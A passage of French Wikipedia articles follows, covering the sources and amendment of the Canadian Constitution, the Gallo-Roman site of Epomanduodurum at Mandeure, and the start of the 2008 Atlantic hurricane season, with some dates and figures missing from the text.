Ce texte crée la structure générale des institutions canadiennes, notamment le pouvoir législatif et exécutif. Elle prévoit le principe du fédéralisme canadien où le palier fédéral de gouvernement et les paliers provinciaux se partagent les compétences législatives. La Loi constitutionnelle de 1867 prévoit aussi que le monarque du Canada continue d'exercer une partie du pouvoir exécutif et législatif. Le Canada est toutefois une monarchie constitutionnelle où le roi ou la reine exerce un pouvoir essentiellement symbolique. La Loi constitutionnelle de 1867 prévoit aussi implicitement un principe de séparation des pouvoirs afin de garantir l'indépendance des tribunaux.
C'est la Loi constitutionnelle de 1867 qui prévoit que le Canada hérite de la tradition constitutionnelle britannique. Le préambule de la Loi énonce que la Constitution du Canada . L'importation des principes constitutionnels britanniques amène la prise en compte des autres sources dans la Constitution du Canada (conventions constitutionnelles, common law).
Loi constitutionnelle de 1982.
La Loi constitutionnelle de 1982 est un autre texte fondamental de la Constitution du Canada. Depuis 1982, il supplée la Loi constitutionnelle de 1867 dans la hiérarchie constitutionnelle. Ce texte a été adopté par le Parlement du Royaume-Uni à la suite de la volonté du Canada de rapatrier la Constitution, c'est-à-dire d'être seul responsable des modifications futures à la Constitution. La Loi constitutionnelle de 1982 a donc été adoptée par une loi du Royaume-Uni, la Loi de 1982 sur le Canada.
La Loi constitutionnelle de 1982 comprend deux parties majeures. Premièrement, elle édicte la Charte canadienne des droits et libertés, une charte des droits qui prime sur toute loi et toute action gouvernementale au Canada. Deuxièmement, la Loi constitutionnelle de 1982 prévoit une formule de modification de la Constitution, procédure inexistante jusqu'alors puisque le Royaume-Uni était responsable de modifier plusieurs pans importants de la Constitution canadienne. La Loi constitutionnelle de 1982 comprend aussi une reconnaissance des droits autochtones et un article consacrant officiellement la suprématie de la Constitution sur toute autre règle de droit au Canada.
La Loi constitutionnelle de 1982 n'a pas fondamentalement changé la structure et le fonctionnement du Canada, toutefois, la charte des droits et libertés a eu une influence majeure sur l'action gouvernementale.
La Loi constitutionnelle de 1982 a été adoptée sans l'assentiment de la province de Québec à la suite de négociations ayant mené à la nuit des longs couteaux. Ce refus du Québec de consentir totalement à cette loi constitutionnelle n'a toutefois aucune conséquence juridique, mais continue d'être un problème politique important au Canada.
Autres textes.
La Constitution comprend un grand nombre d'autres textes constitutionnels.
Il y a d'abord les textes constitutionnels du Royaume-Uni qui sont applicables au Canada. Ils datent tous d'avant 1982, date à laquelle le Royaume-Uni ne peut plus légiférer sur le Canada. Il s'agit par exemple de la "", de l' de 1701 ou de l'Acte de Québec de 1774. Certains de ces textes sont prévus explicitement à l'annexe de la Loi constitutionnelle de 1982 comme les arrêtés en conseil concernant l'entrée de la Colombie-Britannique et de l'Île-du-Prince-Édouard dans la fédération ou le Statut de Westminster de 1931.
Le Parlement du Canada et les parlements provinciaux peuvent aussi édicter des lois de nature constitutionnelle. Il s'agit de lois touchant la structure et le fonctionnement de la fédération ou d'une province. Par exemple, la Loi sur le Parlement du Canada, la Loi sur le gouverneur général et la Loi sur la Cour suprême du Canada sont des lois du Parlement du Canada qui touchent la Constitution. Les provinces peuvent aussi adopter des lois qui touchent leurs propres règles constitutionnelles. Le Québec a adopté plusieurs lois (la Loi sur l'Assemblée nationale, la Loi électorale, la Charte des droits et libertés de la personne) qui font toutes parties de la Constitution du Québec. L'adoption de lois constitutionnelles par le Parlement fédéral ou par les parlements provinciaux ne peut toutefois pas se faire de façon à éviter l'application de la formule de modification de la Constitution.
Common law.
Les règles de common law, c'est-à-dire les règles établies par les décisions des tribunaux, font partie de la Constitution. Certaines proviennent des tribunaux de l'Angleterre, d'autres, des tribunaux canadiens. Toutefois, depuis que le Conseil privé du Royaume-Uni n'est plus le plus haut tribunal au Canada (1949), la common law évolue seulement par les tribunaux canadiens.
Souvent les règles de common law sont l'interprétation du texte de la Constitution. Les tribunaux ont par exemple rendu un grand nombre de décisions pour interpréter les articles touchant au partage des compétences ou à la Charte canadienne des droits et libertés. Parfois, il s'agit tout de même de règles entières qui n'émanent pas d'un texte constitutionnel, comme le principe de la souveraineté parlementaire ou les prérogatives royales.
Bien que la coutume puisse être considérée comme une source distincte de la Constitution, elle est maintenant toujours reconnue dans les décisions judiciaires, si bien qu'elle se confond avec la common law.
À la différence des conventions constitutionnelles, les règles de common law sont créées par les tribunaux. Ces derniers peuvent aussi forcer leur mise en œuvre.
Conventions constitutionnelles.
La Constitution est aussi composée de sources non juridiques et non écrites, à savoir les conventions constitutionnelles. L'existence de ces conventions est typique de la tradition britannique dont a hérité le Canada. Il s'agit de règles politiques considérées comme obligatoires par les acteurs qu'elles concernent. Ces conventions émanent de la pratique et de l'usage entre les acteurs. Malgré leur caractère politique, elles sont d'une importance capitale dans le fonctionnement de la fédération canadienne. Certaines conventions contredisent même le texte écrit de la Constitution.
Les conventions constitutionnelles sont de plusieurs ordres. Un grand nombre d'entre elles régissent le fonctionnement du parlementarisme. Par exemple, même si dans la Loi constitutionnelle de 1867, la reine détient le pouvoir exécutif au Canada, ce pouvoir est exercé par le gouvernement du Canada. Ainsi, la plupart des règles relatives au gouvernement responsable sont des conventions constitutionnelles et ne sont prévues dans aucun texte constitutionnel.
Les tribunaux ne peuvent toutefois pas sanctionner un acteur qui ne respecte pas une convention constitutionnelle. Un acte à l'encontre d'une convention constitutionnelle est tout de même considéré « inconstitutionnel ».
Droits autochtones.
À travers les traités et les jurisprudences reconnaissant les systèmes juridiques des autochtones du Canada, la Constitution du Canada hérite aussi des lois propres des différents peuples autochtones.
Caractéristiques.
Plusieurs caractéristiques ressortent de la Constitution du Canada. Certains de ces principes sont prévus explicitement dans les textes, donc sont issus de l'interprétation que les tribunaux ont fait de la Constitution. Les principaux principes sont les suivants :
Plusieurs autres éléments peuvent aussi décrire la Constitution du Canada, mais ils sont moins spécifiques au Canada. Il s'agit par exemple du principe de la démocratie représentative et celui de la primauté du droit.
Non écrite.
L'une des caractéristiques importantes de la Constitution est qu'elle n'est qu'en partie écrite. Il n'existe pas de document unique, comme aux États-Unis, qui porte le nom de « Constitution ». Une partie se trouve dans des textes constitutionnels (Loi constitutionnelle de 1867, Loi constitutionnelle de 1982), alors qu'une autre partie se trouve dans les conventions constitutionnelles ou dans la common law.
Cette absence de texte unique rassemblant les sources de la Constitution implique que son contenu est en partie indéfini. Ainsi, certaines lois britanniques sont probablement encore d'application, alors que d'autres sont désuètes.
De même, la différence entre le caractère écrit ou non des sources constitutionnels a un impact certain sur la manière de les modifier (voir « Rigidité partielle » ci-dessous).
Monarchie constitutionnelle.
Le Canada est une monarchie constitutionnelle, avec pour chef d'État le monarque du Canada. Une lecture textuelle de la Loi constitutionnelle de 1867 laisse à penser qu'il possède un pouvoir immense. Toutefois, comme dans d'autres monarchies constitutionnelles, un grand nombre de conventions constitutionnelles, de coutumes ou d'autres textes réduisent considérablement ses pouvoirs, qui se limitent bien souvent à des fonctions symboliques.
Ainsi, officiellement, le roi détient le pouvoir exécutif. Il l'exerce sur avis de ses conseillers, c'est-à-dire les ministres et le premier ministre qui forment le Conseil privé du Roi pour le Canada. Dans les faits, le pouvoir exécutif est exercé par le Cabinet du Canada.
Le monarque participe aussi au pouvoir législatif. Avec la Chambre des communes et le Sénat, il est l'une des trois composantes du Parlement du Canada. Son rôle est dorénavant complètement symbolique, puisque, même s'il doit sanctionner tous les projets de loi, il n'a jamais refusé une loi fédérale depuis 1867.
Le monarque remplit également quelques fonctions honorifiques, comme la remise de prix ou la participation à certaines cérémonies officielles.
Pour l'exercice de ses fonctions, le monarque est représenté au Canada par le gouverneur général. Au niveau provincial, le monarque est représenté par les lieutenants-gouverneurs.
Fédéralisme.
Le fédéralisme est l'une des caractéristiques fondamentales de la Constitution canadienne. Lors de la fondation du Dominion en 1867, cette caractéristique constitutionnelle a été inspirée par les États-Unis. Elle est issue d'un compromis des pères de la Confédération entre les partisans d'un État central fort et ceux qui privilégiaient une plus grande décentralisation. Ainsi, le fédéralisme canadien permettait une union économique tout en préservant une autonomie visant à protéger les minorités.
Le fédéralisme canadien se manifeste de plusieurs manières.
Il existe d'abord un partage des compétences législatives entre le palier fédéral et les provinces. Cette division des pouvoirs est principalement prévue par la Loi constitutionnelle de 1867. Le palier fédéral s'est vu confier les principaux pouvoirs économiques, fiscaux, militaires et tous les domaines stratégiques. Il possède de plus quelques pouvoirs de nature sociale, notamment ceux se rapportant au droit criminel et au divorce. De même, le fédéral possède les pouvoirs résiduels et le pouvoir d'agir dans l'intérêt national en certaines circonstances. Les provinces quant à elles sont responsables des affaires locales, sociales et sur les relations privées entre individus.
Le fédéralisme canadien prévoit que le partage des compétences a une valeur supralégislative. Les gouvernements ne peuvent modifier unilatéralement la division des pouvoirs, ni se les échanger.
Le fédéralisme canadien se manifeste aussi par le programme de péréquation qui équilibre les revenus fiscaux des provinces.
Le fédéralisme canadien n'est pas un équilibre parfait entre les deux ordres du gouvernement. Le gouvernement fédéral possède quelques moyens théoriques de s'ingérer dans les affaires des provinces. Il peut utiliser un pouvoir de réserve ou de désaveu pour éviter la mise en œuvre des lois provinciales. Il est celui qui nomme les lieutenants-gouverneurs des provinces. Le gouvernement fédéral utilise aussi un pouvoir de dépenser qui lui permet de subventionner conditionnellement des champs de compétences provinciaux.
Séparation des pouvoirs.
La séparation des pouvoirs au Canada est qualifiée de « souple », puisque, contrairement à d'autres pays comme les États-Unis, il n'y a pas de division étanche entre les sphères de pouvoirs. Par exemple, il y a beaucoup de collaboration et de flexibilité entre la sphère exécutive et la sphère législative de l'État. Les membres de l'exécutif siègent toujours au Parlement, alors que le Parlement délègue fréquemment ses pouvoirs à l'exécutif (possibilité pour l'exécutif d'adopter des règlements, de modifier certaines lois).
Par contre, le principe de séparation des pouvoirs est appliqué avec plus de rigueur entre le pouvoir judiciaire et les acteurs politiques. La Constitution prévoit implicitement un principe d'indépendance des juges canadiens en leur garantissant un salaire élevé et une nomination jusqu'à .
Historiquement, plusieurs auteurs considéraient que le principe de séparation des pouvoirs n'était pas un principe constitutionnel canadien, mais que c'était celui de la souveraineté parlementaire qui dominait. Toutefois, depuis l'adoption de la Loi constitutionnelle de 1982, l'importance de la souveraineté parlementaire a grandement diminué puisque la Charte canadienne des droits et libertés donne aux tribunaux un plus grand pouvoir d'invalider les lois.
Protection des minorités.
La protection des minorités est un principe important de la Constitution du Canada.
Le fédéralisme canadien constitue un moyen d'accorder un pouvoir important aux différents groupes qui composaient le Canada au , soit les anglophones et les francophones. De même, la Loi constitutionnelle de 1867 protège plusieurs droits de manière à assurer la protection de la minorité anglophone située dans la province de Québec et la minorité francophone présente dans le reste du Canada. Elle assure par exemple la place du français dans les lois fédérales et québécoises. De plus, les conditions du mariage et du divorce sont confiées au Parlement fédéral de manière que les provinces ne les restreignent pas.
La Loi constitutionnelle de 1982 protège aussi certains droits des minorités. Elle constitutionnalise certains droits des peuples autochtones et affirme le caractère bilingue de la province du Nouveau-Brunswick. Le droit à l'instruction dans la langue de la minorité (le français ou l'anglais selon le cas) est aussi protégé.
Protection des droits et libertés.
La Constitution du Canada protège un grand nombre de droits fondamentaux et de libertés.
Avant l'adoption de la Charte canadienne des droits et libertés en 1982, la protection des droits fondamentaux était timide dans la Constitution canadienne. Cette protection était principalement contenue dans les documents historiques anglais qui faisait encore partie de la Constitution canadienne (la de 1215, la Pétition des droits de 1628, l'Acte d'habeas corpus de 1679, la Déclaration des droits de 1689 et l'Acte d'établissement de 1701). Certains juges ont d'ailleurs émis l'opinion que la Constitution contenait une déclaration des droits implicite qui protégeait certaines libertés démocratiques et parlementaires. Ainsi, à l'époque, les droits et libertés se résumaient souvent à la protection de certains droits conférés aux minorités francophones et anglophones (voir « Protection des minorités » ci-dessus). À partir de la deuxième moitié du , des droits et libertés sont néanmoins protégés hors de la Constitution canadienne, c'est-à-dire dans certaines lois quasi constitutionnelles comme la Déclaration canadienne des droits adoptée en 1960.
Le portait de la protection des droits et libertés change radicalement avec l'adoption de la Charte canadienne des droits et libertés.
Interprétation.
Comme dans plusieurs pays de tradition judiciaire britannique, les tribunaux canadiens jouent un rôle important dans l'évolution du droit. Dans l'interprétation de la Constitution, les tribunaux disposent donc d'une marge de manœuvre considérable. Leur interprétation a un impact politique immense, puisqu'ils précisent notamment le partage des compétences législatives et la portée de la Charte canadienne des droits et libertés.
Il n'y a pas une unique théorie de l'interprétation juridique de la Constitution du Canada, mais une série de principes que les tribunaux appliquent pour dégager le sens de la Constitution. Toutefois, un des principes importants est celui de l'arbre vivant. Ce principe signifie que l'interprétation de la Constitution ne doit pas être figée selon l'interprétation qu'en avait les rédacteurs, mais doit évoluer pour tenir compte des changements de la société canadienne. La Constitution est donc un Ce principe a permis au Conseil privé de conclure que le mot « personne » dans la Constitution désignait les femmes, même si ce n'était pas le but des rédacteurs de la Constitution.
Ainsi, contrairement aux États-Unis, l'originalisme n'est pas une doctrine d'interprétation importante au Canada. Malgré tout, les juges utilisent parfois des indices de l'intention des rédacteurs de la Constitution pour prendre leurs décisions.
Pour aider les tribunaux à analyser la Constitution, la Cour suprême a aussi dégagé les « principes implicites » qui s'y trouvent, c'est-à-dire les principes qui servent parfois à en combler les trous. On y retrouve notamment : la démocratie, le fédéralisme, la primauté du droit, la protection des minorités et l'indépendance judiciaire.
L'interprétation de la Constitution du Canada fait partie des champs d'étude du droit constitutionnel canadien.
Modifications.
La modification de la Constitution du Canada peut se faire de plusieurs façons. Celles-ci sont prévues par les différentes procédures de modification.
Avant le rapatriement de la Constitution en 1982, le Royaume-Uni était responsable de la modification de la majeure partie de la Constitution canadienne. Tout ce qui ne relevait pas de la constitution interne (comme la composition des assemblées législatives) devait être approuvé par le Parlement du Royaume-Uni.
Rigidité partielle.
Tout le contenu de la Constitution ne se modifie pas de la même manière. Ainsi, une partie de la Constitution est rigide puisque sa modification implique une procédure complexe (voir « Procédures de modification ci-dessous) qui est différente de celle de l'adoption d'une loi ordinaire. Cette formule de modification rigide a été édictée dans la Loi constitutionnelle de 1982 lors du rapatriement de la Constitution. Cette modification formelle touche plusieurs des éléments fondamentaux du Canada comme le fédéralisme ou la Charte canadienne des droits et libertés. La difficulté de modifier ces parties de la Constitution a soulevé plusieurs critiques. Dans les faits, une grande partie des textes constitutionnels fondamentaux de la Constitution ne peuvent être modifiés que par l'assentiment quasi unanime des gouvernements. Cela explique pourquoi, depuis l'adoption de la formule de modification de 1982, il n'y a eu aucune modification importante des textes constitutionnels.
Toutefois, plusieurs portions de la Constitution sont très souples. Les règles constitutionnelles édictées par simple loi des parlements peuvent être modifiées de la même façon. Les règles coutumières ou orales sont celles qui bénéficient du plus grand niveau de souplesse. Elles n'existent que dans la stabilité que leur procurent les acteurs.
Procédures de modification.
Il existe cinq procédures distinctes de modification de la Constitution du Canada. Elles sont prévues aux articles 38 à 47 de la Loi constitutionnelle de 1982. Chacune s'applique à une certaine catégorie de modifications constitutionnelles. Il s'agit de (1) la formule générale, (2) la formule de l'unanimité, (3) la formule bilatérale ou multilatérale, (4) la formule unilatérale fédérale et (5) la formule unilatérale provinciale.
La formule générale s'applique lorsqu'aucune autre procédure n'est prévue. Elle exige que la modification soit adoptée par la Chambre des communes, par le Sénat et par les assemblées législatives d'au moins sept provinces représentant au moins 50 % de la population. Cette formule est fréquemment appelée « 7 / 50 ». Elle doit être utilisée, par exemple, pour modifier le partage des compétences ou la Charte canadienne des droits et libertés.
La formule de l'unanimité s'applique pour cinq types de modifications prévues à l'article 41 de la Loi constitutionnelle de 1982. Il s'agit de la monarchie canadienne, du droit d'une province d'avoir au moins autant de députés à la Chambre des communes qu'au Sénat, de l'usage du français et de l'anglais, de la composition de la Cour suprême et des changements à la formule de modification. Dans ces cas, la modification doit être adoptée par la Chambre des communes, le Sénat et par toutes les assemblées législatives des provinces.
La formule bilatérale ou multilatérale s'applique lorsqu'une ou plusieurs provinces et le gouvernement fédéral veulent modifier une disposition de la Constitution qui ne touche que cette ou ces provinces. Dans ces cas, seul le gouvernement fédéral et la ou les provinces touchées ont à donner leur accord. Cela s'applique notamment à la modification d'une frontière entre deux provinces ou à la modification de dispositions qui ne touchent qu'une seule province (sur la langue officielle de la province ou sur les dispositions de protections religieuses par exemple).
Finalement, les deux dernières formules (unilatérale fédérale et unilatérale provinciale) permettent à un palier de gouvernement de modifier sa constitution interne, c'est-à-dire les règles qui touchent par exemple le ou du fédéral. Cette procédure de modification existait déjà dans la Loi constitutionnelle de 1867 et a été confirmée dans la Loi constitutionnelle de 1982. Par exemple, en 1968, le Québec a aboli son Conseil législatif pour devenir un Parlement unicaméral.
Modifications.
Depuis la fondation du Canada en 1867, la Constitution connut plusieurs modifications. Seules les plus importantes sont mentionnées.
De 1867 à 1982, le Parlement du Royaume-Uni était responsable de modifier la majeure partie de la Constitution canadienne. Il a notamment permis au Parlement du Canada de créer par lui-même de nouvelles provinces à même les territoires fédéraux, lui a conféré la souveraineté externe face au Royaume-Uni par le Statut de Westminster, lui a donné le droit de légiférer sur l'assurance-emploi et lui a permis de modifier sa constitution interne.
Depuis l'adoption des formules de modification dans la Loi constitutionnelle de 1982, une dizaine de modifications constitutionnelles ont été apportées. L'une des plus importantes a été la consécration de l'égalité du français et de l'anglais au Nouveau-Brunswick. La protection des droits autochtones a aussi été renforcée. Le Québec et Terre-Neuve ont aussi modifié des dispositions de la Constitution sur les écoles religieuses.
Finalement, comme certaines portions de la Constitution se trouvent dans les lois ordinaires votées par les parlements (voir « Autres textes » ci-dessus), la Constitution est modifiée chaque fois que ces textes le sont. Ces modifications ne nécessitent toutefois aucune formalité.
Tentatives avortées.
Après 1982, deux tentatives majeures de modifier la Constitution ont échoué : l'Accord du lac Meech et l'Accord de Charlottetown. Le Québec n'ayant pas signé la Loi constitutionnelle de 1982, l'Accord du lac Meech visait à apporter des modifications à la Constitution afin d'obtenir l'accord du Québec à la loi de 1982. Élaboré en 1987, l'accord prévoyait cinq modifications : la reconnaissance du Québec comme une société distincte, de plus grands pouvoirs au Québec sur l'immigration, la limitation du pouvoir fédéral de dépenser, l'octroi d'un droit de veto au Québec pour des modifications constitutionnelles et une participation à la nomination des juges québécois à la Cour suprême du Canada. Plusieurs de ces modifications nécessitaient l'accord unanime des provinces et du gouvernement fédéral. Le Manitoba et Terre-Neuve n'ayant pas adopté l'accord à l'intérieur du délai de prévu à la formule de modification, l'Accord du lac Meech n'est jamais entré en vigueur.
Il en a été de même pour l'Accord de Charlottetown. Cet accord, conclu en 1992 à la suite d'intenses négociations constitutionnelles, comprenait une révision majeure de la Constitution canadienne. On y trouvait notamment une plus grande autonomie pour les peuples autochtones, quelques mesures de décentralisation de la fédération, une réforme du Sénat et du processus de nomination des juges à la Cour suprême du Canada. Cet accord a été rejeté par référendum par 54 % de la population.
Finalement, quelques autres modifications constitutionnelles ont été tentées sans succès par des députés ou des gouvernements. Elles visaient à ajouter un droit à la propriété dans la Constitution, reformer le Sénat, reconnaître des droits au fœtus ou retirer la référence à Dieu dans la Loi constitutionnelle de 1982. Aucune d'entre elles n'a abouti.
Contrôle de la constitutionnalité.
Le contrôle de la constitutionnalité d'une loi, d'une règle de droit ou de tout acte se fait par les tribunaux du Canada. Ainsi, les tribunaux peuvent invalider une loi en déclarant qu'elle n'est pas conforme à la Constitution. Le contrôle de l'application de la Constitution ressemble beaucoup à celui en vigueur aux États-Unis et en Australie.
Tous les tribunaux supérieurs peuvent se prononcer sur la constitutionnalité d'une loi (c'est-à-dire les cours supérieures, les cours d'appel et la Cour suprême). La Cour suprême est souvent appelée à trancher sur les litiges constitutionnels, puisque les parties vont en appel des décisions des cours supérieures et des cours d'appel.
Les tribunaux ne peuvent par eux-mêmes déclarer une loi ou un acte inconstitutionnel. Un jugement d'inconstitutionnalité peut se faire de trois façons : soit par demande directe au tribunal, soit dans le cadre d'un litige ou soit par l'initiative d'un gouvernement.
En pratique, la grande majorité des lois inconstitutionnelles le sont pour deux raisons : soit elles ne respectent pas le partage des compétences entre les provinces et le Parlement fédéral, soit elles ne respectent pas la Charte canadienne des droits et libertés.
Enjeux actuels.
Parmi les enjeux actuels touchant la Constitution du Canada, on peut noter la réforme du Sénat et l'adhésion du Québec à la Constitution.

</doc>
<doc id="568758" url="https://fr.wikipedia.org/wiki?curid=568758" title="Musique Baroque">
Musique Baroque



</doc>
<doc id="568761" url="https://fr.wikipedia.org/wiki?curid=568761" title="Epomanduodurum">
Epomanduodurum

Epomanduodurum était une agglomération secondaire gallo-romaine, qui correspond aujourd'hui à la ville de Mandeure (Doubs). À l'époque romaine, Epomanduodurum était un des centres urbains majeurs de la Germanie Supérieure. Bâtie sur un croisement de routes, la ville connait son apogée au . Les vestiges de cette époque, dont le plus visible est le théâtre antique, témoignent de l'importance et de la complexité du site antique.
Les différentes campagnes de fouilles menées depuis le ont permis de mettre au jour d'importants vestiges dont certains remontent à la période gauloise et permettent de montrer la présence de l'homme sans discontinuité depuis cette époque.
Histoire.
Une occupation du site par les Gaulois.
Des traces de la présence gauloise sont attestées à partir du , bien qu'aucun témoignage de l'existence d'un oppidum n'ait été trouvé. De cette époque, des objets rituels ont été mis au jour dans une nécropole gauloise du sur la ville voisine de Mathay.
Une ville gallo-romaine.
À l'époque romaine, "Epomanduodurum" était une importante agglomération séquane, la deuxième après Vesontio. En effet, l'agglomération était à un carrefour de deux axes de communication majeurs (Route de Lyon à Kembs et la route de Vesontio via les plateaux jusqu'à Bâle) et la navigation fluviale sur le Doubs, existant déjà à cette époque là, ne pouvait aller plus en amont d'Epomanduodurum. La ville servait également de station relais pour les légions romaines. Elle est d'ailleurs mentionnée sur l'itinéraire d'Antonin et situé à 31 milles de Vesontio. De nombreux vestiges en subsistent aujourd'hui : théâtre adossé à flanc de colline (le plus grand de Gaule), thermes, habitations. À la fin du , une rétractation de la cité est constatée et des fortifications apparaissent.
Un site occupé du Haut Moyen Âge à nos jours.
Après le déclin de la ville, le site continue d'être occupé et une charte du mentionne en tant que « Mandroda » ou « Mandorum » un castrum à la place de l'agglomération antique et confirme donc une occupation ininterrompue depuis l'époque gauloise jusqu'à nos jours.
Urbanisme.
Époque gauloise.
Déjà présente à l'époque gauloise, la cité présentait les atours d'une grande ville : un habitat disséminé, présence d'un espace funéraire et d'un sanctuaire. Elle était située sur un axe de pénétration du Jura, indispensable à l’époque des métaux pour les échanges avec les populations des plateaux via la haute vallée du Doubs. À cette époque, la cité gauloise se présente comme une "ville de plaine" et non sous une forme d'oppidum.
Époque gallo-romaine.
Les différentes fouilles laissent apparaître une surface urbaine maximale d'environ , délimités à l'ouest par le lieu-dit de "l'Essarté" et à l'est par le secteur de "Courcelles". Jusqu'au , les voies urbaines de Mandeure reprenaient à grands traits le réseau urbain antique. Les trois axes principaux de la ville antique convergeaient vers le passage sur le Doubs. Les voies de circulation sur la rive droite épousent le relief par manque de place et sont orientés parallèlement au Doubs. Sur la rive gauche sur "Le faubourg du pont" ainsi qu'à "l'éssarté", les rues sont quadrillés régulièrement comme dans de nombreuses cités romaines.
L'agglomération s'est développée de part et d'autre du Doubs, autour d'un point de passage sur la rivière. La rive droite comportait des espaces funéraires, des habitations et le "Clos du château", le complexe monumental où se trouvait le théâtre et le sanctuaire. Sur la rive gauche, le "Quartier du pont" semble avoir été un quartier artisanal.
Trois complexes religieux semblaient exister :
Les fouilles.
Historique.
Les scientifiques commencèrent à s’intéresser à l'agglomération romaine à l'époque moderne, entre les , en particulier Jean Bauhin, Heinrich Schickhardt ou Jean-Jacques Chifflet. Les études du site continueront entre 1783 et 1785 sous l'impulsion de Léonard Parrot, dont les travaux seront repris par Charles Duvernoy. Les fouilles continuent sous la restauration, alors qu'un cadre juridique de protection se met en place, sous l'impulsion de Frédéric Morel-Macler aidé par Prosper Mérimée qui classera le site. Les interprétations de ces études de l'époque sont sujettes à caution (erronées ou tronquées). Au , sur le site du Clos du château, la récupération de matériaux pour la construction permet la découverte de vestiges, qui seront fouillés de manière scientifique par C. Duvernoy et H. L'Epee. C. Duvernoy en conclut à l'existence d'une basilique mais ce n'est qu'en 1933 que H. Koethe identifie l'ensemble des vestiges comme étant les restes d'un sanctuaire gallo-romain.
Les méthodes utilisées.
Au , les fouilles continuent en utilisant diverses méthodes :
Résultats des fouilles.
De nombreux éléments ont été découverts lors des différentes campagnes de fouilles. Les découvertes principales :
Monuments antiques.
Le clos du château.
Le "clos du château" désigne un espace cultuel de dix hectares situé entre le plateau du Lomont et le Doubs. Il se composait de quatre ensembles : Le théâtre à l'est, le sanctuaire du "clos du château" à l'ouest, le sanctuaire du "champ des fougères" au nord et divers bassins au sud. L'ensemble forme un "site classé" des monuments historiques depuis 1912.
Le théâtre.
Seul élément visible des vestiges de l'ancienne cité, le théâtre est adossé à la colline. Avec de diamètre, il est le plus grand de Gaule, juste devant celui d'Autun. Les gradins s'appuyaient en partie sur la colline, et couvraient un dédale d'escaliers, de couloirs, loges et décors. Les quatre étages de gradins pouvaient accueillir . Côté scène, les façades atteignaient une hauteur de . Le théâtre est classé aux monuments historiques en 1964.
Le sanctuaire du clos du château.
La présence d'un sanctuaire d'origine gauloise est attestée par de nombreux objets découverts au cours des années 1990 (fibules, bracelets, vaisselle, etc.). L'ensemble cultuel présente des similitudes avec d'autres sanctuaires de la même époque et de la région. Ce sanctuaire gaulois devait être un centre d'importance car les Romains ont ensuite bâti un complexe important (théâtre, thermes, temples) par-dessus celui-ci.
Situé face au théâtre, ce sanctuaire romain devait être un lieu de pèlerinage important. Le temple avait des dimensions de de long sur de large et était entouré d'une enceinte elliptique (péribole - en fait constitué de 36 arêtes de de longueur) dont les dimensions sont de sur et l'épaisseur des murs de qui délimitait une surface d'environ un hectare. Le péribole et le temple forment un ensemble original pour l'époque. L'enceinte, qui laisse entrevoir deux entrées diamétralement opposées à l'est et à l'ouest, a été construite postérieurement au temple romain afin de rattraper l'alignement avec le théâtre antique.
Jouxtant le temple, des caveaux funéraires ont été mis au jour.
Le sanctuaire du champ des fougères.
Daté du , le sanctuaire, délimité par une enceinte curviligne, s'est développé au fil du temps. Les vestiges et le mobilier atteste la pratique de rituels et de cérémonies religieuses. Le mobilier issu de dons des fidèles sont de faible valeur : bague, fibules, perles en verre. Des couteaux rituels des et des carcasses de bœufs attestent quant à eux la présence de cérémonies d'abattage. Le sanctuaire pourrait être dédié à Mars et à Minerve.
Les bains de Courcelles.
Les bains de Courcelles (ou thermes de Courcelles) sont situés à l'est de la ville au lieu-dit de Courcelles. Ils sont détruits depuis le et sont désormais enfouis ; Ils ne sont mis au jour que lors des travaux de prospection (réfection de chaussée, etc.). Inscrits au titre des monuments historiques en 1990, ils forment un ensemble « monumental » avec piscines et hypocaustes et se serait développé autour de la "source de Courcelles".
Les fortifications.
La supposition et la découverte des fortifications sont plutôt tardives (sondages en 1990).
Érigées entre les , un ensemble fortifié a été mis au jour au lieu-dit "champ des Cloux du château" non loin du théâtre antique. Ces fortifications sont en forme « de cloche », c'est-à-dire qu'ils formaient un demi-cercle et qu'une muraille fermait ce demi-cercle le long du Doubs. Ces murailles, composées de tours semi-circulaires, avaient pour but de protéger le passage sur la rivière, ainsi que le port fluvial sur le Doubs.
L'ensemble fortifié délimite une zone d'un hectare et demi environ et présente des similitudes avec les ensembles fortifiés des cités voisines.
Ces fortifications et le mobilier martial trouvé confirme la présence militaire au . Des objets issus de diverses régions (Savoie, Bourgogne, nord de la Gaule, etc.) démontre la variété d'approvisionnement à cette époque là.
Le peu de sondages et fouilles effectuées sur les fortifications ne permet pas de connaître la disposition précise des lieux mais laisse place à des hypothèses.
Le faubourg du pont.
Les diverses fouilles ont mis au jour dans ce quartier plusieurs bâtiments à vocation artisanale datant du . Les différents fragments ont révélé que l'activité artisanale du quartier concernait la poterie, la métallurgie (fer et bronze) et la boucherie. L'activité artisanale perdurera jusqu'à la fin du .
L'essarté.
Le quartier de l'essarté est situé sur l'actuelle commune de Mathay. Ce quartier était distant d'un kilomètre et demi du centre urbain d'Epomanduodurum et était spécialisé en artisanat de la céramique. Occupé dès le et jusqu'au , ce quartier est organisé autour d'un quadrillage de rues régulières sur une surface d'environ vingt hectares.
Autres quartiers.
Les différentes campagnes de fouilles ont mis au jour d'autres quartiers ayant différentes vocations. Ainsi, le quartier à vocation résidentielle des "mallots", "les hauts de Mathay", quartier à vocation artisanale et déjà occupé au millénaire avant notre ère et le quartier de la "rue de la récille" formés d'habitations et d'entrepôts viennent compléter l'ensemble archéologique de la ville antique.
Chronologie simplifiée.
Principaux jalons de l'histoire d'Epomanduodurum :

</doc>
<doc id="568764" url="https://fr.wikipedia.org/wiki?curid=568764" title="Cours sainte marie de Hann">
Cours sainte marie de Hann



</doc>
<doc id="568765" url="https://fr.wikipedia.org/wiki?curid=568765" title="Saison cyclonique 2008 dans l'océan Atlantique nord">
Saison cyclonique 2008 dans l'océan Atlantique nord

La saison 2008 des ouragans (cyclones tropicaux dans l'océan Atlantique) était en cours du au , selon la définition de l'Organisation météorologique mondiale. La saison a débuté en fait le avec la tempête tropicale Arthur, un système qui a donné des précipitations abondantes sur le Yucatán. L'ouragan Bertha est un ouragan majeur mais ne touche aucune terre. Pendant que la tempête tropicale Cristobal passe au large de la côte est des États-Unis, l'ouragan Dolly donne de fortes pluies sur l'extrême nord du Mexique, le Texas et les territoires voisins. Ce dernier est suivi de la tempête tropicale Edouard.
